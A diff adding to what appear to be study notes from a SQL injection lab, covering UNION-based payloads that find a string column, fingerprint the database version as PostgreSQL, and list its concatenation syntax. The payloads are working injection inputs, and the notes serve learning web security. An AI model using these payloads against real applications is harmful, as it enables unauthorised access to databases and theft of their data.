@@ -14,3 +14,21 @@ etc.
 ```
 - after trying payloads we fnd that db has 2 columns
 - now to determining datatypes of columns or which columns has string datatype
+```
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL,'a'--
+```
+- second payload works and the second column is the string datatype
+- now to ouput data from columns we cna use 2 methods first one is to ouput each column alone and second method is to concatenate the results
+- first we need to determine db version to procced with the concatenation
+- we try differnet payloads
+```
+' UNION SELECT NULL,@@version--   Microsoft/MYSQL
+' UNION SELECT NULL,version()--   PostgreSQL
+```
+- the second payload works and its a postgresql db
+- postgresql has 2 differnet ways of concatenation
+```
+'foo'||'bar'
+'foo' 'bar'
+```
